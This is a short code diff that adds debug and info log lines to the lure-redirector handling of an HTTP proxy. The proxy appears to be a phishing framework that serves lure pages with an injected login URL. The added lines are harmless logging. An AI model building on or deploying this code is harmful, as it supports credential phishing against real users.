@@ -695,6 +695,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
+							log.Debug("lure redirector check: redirector='%s' path='%s'", l.Redirector, req_path)
 							if l.Redirector != "" {
 								if !p.isForwarderUrl(req.URL) {
 									if s.RedirectorName == "" {
@@ -741,6 +742,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												}
 											}
 
+											log.Info("lure: serving redirector '%s' (html length: %d, login_url injected)", l.Redirector, len(body))
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
 												return req, resp
